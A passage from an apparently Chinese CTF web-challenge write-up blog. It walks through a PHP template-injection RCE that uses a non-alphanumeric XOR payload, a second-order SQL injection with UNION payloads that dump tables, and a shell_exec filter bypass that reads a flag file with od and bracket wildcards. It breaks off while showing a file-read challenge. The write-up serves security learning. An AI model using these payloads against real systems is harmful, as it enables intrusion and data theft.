class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$hash_user</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">	<span class="variable">$hash_pass</span> = <span class="string">&#x27;zsf&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]))&#123;</span><br><span class="line">		<span class="comment">//filter</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &gt; <span class="number">6</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) &gt; <span class="number">25</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\(\)\*&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">					<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[a-z,A-Z,0-9&gt;\?]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]);</span><br><span class="line">					<span class="variable">$template</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">					<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__USER__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$template</span>);</span><br><span class="line">					<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PASS__&quot;</span>, <span class="variable">$hash_pass</span>, <span class="variable">$content</span>);</span><br><span class="line">					<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__WEBSITE__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">					<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PUNC__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">					<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;sandbox/&#x27;</span>.<span class="variable">$hash_user</span>.<span class="string">&#x27;.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">					<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>, <span class="variable">$hash_pass</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">		<span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:sandbox/<span class="subst">$hash_user</span>.php&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>没什么有用的，试试读取登陆后的sandbox+sessid.php，去除没用的js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$user</span> = ((<span class="keyword">string</span>)<span class="number">2</span>);</span><br><span class="line">	<span class="variable">$pass</span> = ((<span class="keyword">string</span>)zsfc81e728d9d4c2f636f067f89cc14862c);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="variable">$user</span> &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>] === <span class="variable">$pass</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以及get_pic.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$image</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;img&quot;&gt; &lt;img src=&quot;data:image/png;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>)) . <span class="string">&#x27;&quot; /&gt; &lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以任意读，但是不知道flag叫什么在哪里</p>
<p>在template.html中的php代码有些许不一样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span> = ((<span class="keyword">string</span>)__USER__);</span><br><span class="line"><span class="variable">$pass</span> = ((<span class="keyword">string</span>)__PASS__);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="variable">$user</span> &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>] === <span class="variable">$pass</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> ...</span><br><span class="line">&lt;a href=<span class="string">&quot;#&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">powered_by</span>&quot;&gt;<span class="title">__PUNC__</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">ul</span> <span class="title">id</span>=&quot;<span class="title">deskIcon</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里可以发现一些字段是<code>__xxxx__</code>来表示的，回到最开始的index.php中，可以发现开头有些waf还有一些回显的机制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]))&#123;</span><br><span class="line">	<span class="comment">//filter</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &gt; <span class="number">6</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) &gt; <span class="number">25</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\(\)\*&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[a-z,A-Z,0-9&gt;\?]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]);</span><br><span class="line">				<span class="variable">$template</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">				<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__USER__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$template</span>);</span><br><span class="line">				<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PASS__&quot;</span>, <span class="variable">$hash_pass</span>, <span class="variable">$content</span>);</span><br><span class="line">				<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__WEBSITE__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">				<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PUNC__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p>user长度不超过6，<code>[^\w\/\(\)\*&lt;&gt;]</code>禁止了空格、取反、左右括号、斜杠、星号、左右尖括号；website的长度不超过6，<code>[^\w\/\*:\.\;\(\)\n&lt;&gt;]</code>限制了空格、取反、左右括号、斜杠、星号、左右尖括号、换行、冒号、点、分号。字符限制蛮严格的，但是punctuation禁止数字字字母以及<code>&gt;?</code>，只能利用index.php下的<code>&lt;?php</code>来执行，可以考虑无数字字母rce了。生成一个payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;($((%-&#x27;</span>^<span class="string">&#x27;[][\@@&#x27;</span>;<span class="variable">$__</span>=<span class="string">&#x27;#:%(&#x27;</span>^<span class="string">&#x27;|&#125;`|&#x27;</span>;<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="keyword">echo</span> <span class="variable">$___</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>通过控制用户名为多行注释，在punc处闭合，从而利用最开头的<code>&lt;?php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">username:</span><br><span class="line">p/*</span><br><span class="line">passwd:</span><br><span class="line">任意</span><br><span class="line">website:</span><br><span class="line">任意</span><br><span class="line">Punctuation：</span><br><span class="line">*/); PAYLOAD /*</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20240109114440640.png" alt="image-20240109114440640"></p>
<p><img src="/images/image-20240109114501346.png" alt="image-20240109114501346"></p>
<h1 id="178-October-2019-Twice-SQL-Injection"><a href="#178-October-2019-Twice-SQL-Injection" class="headerlink" title="178.[October 2019]Twice SQL Injection"></a>178.[October 2019]Twice SQL Injection</h1><p>在用户名中存在sql注入，注册完成后登陆即可看到回显，是为二次注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">username:1&#x27; union select database()#</span><br><span class="line">#ctftraining</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">username:1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;#</span><br><span class="line">#flag,id,title,content,time,id,username,password,info</span><br><span class="line"></span><br><span class="line">payload3:</span><br><span class="line">username:1&#x27; union select group_concat(flag) from ctftraining.flag#</span><br></pre></td></tr></table></figure>

<h1 id="179-广东强网杯-2021-团队组-love-Pokemon"><a href="#179-广东强网杯-2021-团队组-love-Pokemon" class="headerlink" title="179.[广东强网杯 2021 团队组]love_Pokemon"></a>179.[广东强网杯 2021 团队组]love_Pokemon</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DefenderBonus</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;catch broken Pokemon! mew-_-two&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Pokemon</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ghostpokemon</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$Pokemon</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$pks</span>) &#123;</span><br><span class="line">            <span class="variable">$Pokemon</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$pks</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$Pokemon</span> = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$Pokemon</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;myfavorite&#x27;</span>] ?? <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;picacu!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;picacu!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;bulbasaur!&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;miaowa!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$level</span> = <span class="variable">$_POST</span>[<span class="string">&quot;levelup&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ((!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="variable">$level</span>)) &amp;&amp; (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lv100/i&#x27;</span>,<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$level</span>))))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./hint.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;squirtle&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;jienijieni!&#x27;</span>).<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;mewtwo&#x27;</span>:</span><br><span class="line">        <span class="variable">$dream</span> = <span class="variable">$_POST</span>[<span class="string">&quot;dream&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$dream</span>)&gt;=<span class="number">20</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;So Big Pokenmon!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">ghostpokemon</span>(<span class="variable">$dream</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$dream</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>escapeshellarg()</code>的作用是把字符串转码为在shell命令里使用的参数，它的特性是在处理超过ascii范围的字符会直接过滤，用一些不可见字符来绕过就行，如<code>%81</code></p>
<p><img src="/images/image-20240109143450117.png" alt="image-20240109143450117"></p>
<p>接着绕过非常严格的waf，用的是od命令，会将读取到的文件内容以八进制形式输出。flag无法使用*?通配符，用的是[]通配符，waf有a和l，[B-Z]就能匹配到B-Z之间任意一个字母我们要的是L，[@-Z]就能匹配到@-Z之间任意一个字母，我们要的是A，空格可以用%20(space)或者%09(tab)来绕过,od命令存在-c参数以ascii形式输出</p>
<p>payload:<code>myfavorite=mewtwo&amp;dream=od%09/F[B-Z][@-Z]G%09-c</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000 N S S C T F &#123; 3 4 7 8 a 4 e 3 - 0000020 6 0 6 2 - 4 8 b 9 - 9 3 c 5 - 0 0000040 7 3 a b 8 e 0 a d 3 9 &#125; \n 0000055</span><br></pre></td></tr></table></figure>

<p>去掉中间的20和40那串就可以了</p>
<h1 id="180-CISCN-2019华北Day1-Web1"><a href="#180-CISCN-2019华北Day1-Web1" class="headerlink" title="180.[CISCN 2019华北Day1]Web1"></a>180.[CISCN 2019华北Day1]Web1</h1><p>随便注册登陆，随便传个文件，下载抓包可以任意读</p>
<p>读取&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/panel.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span><br><span class="line">    &lt;ol <span class="class"><span class="keyword">class</span>=&quot;<span class="title">breadcrumb</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span 